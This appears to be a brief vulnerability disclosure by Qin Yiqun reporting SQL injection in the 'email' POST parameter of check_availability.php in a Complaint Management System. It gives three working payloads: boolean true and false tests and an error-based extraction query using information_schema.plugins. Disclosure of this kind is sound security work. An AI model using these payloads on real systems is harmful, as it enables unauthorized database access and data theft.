BUG_Author:Qin Yiqun

Vulnerability File: /Complaint Management System/users/check_availability.php

POST parameter 'email' exists SQL injection vulnerability

Payload1:email=john@gmail.com' and 'u'='u

The sql statement is executed correctly

![image](https://github.com/qinyiqun/bug_report/blob/main/sql1.png)

Payload2:email=john@gmail.com' and 'u'='w

The sql statement was executed incorrectly, causing the page not to be echoed normally

![image](https://github.com/qinyiqun/bug_report/blob/main/sql2.png)

Payload3:email=john@gmail.com' and (select 1 from(select count(*),concat(0x51525354,(select (elt(999=999,1))),0x65666768,floor(rand(0)*2))x from information_schema.plugins group by x)a) and 'v'='v

Injection success based on errors

![image](https://github.com/qinyiqun/bug_report/blob/main/sql3.png)
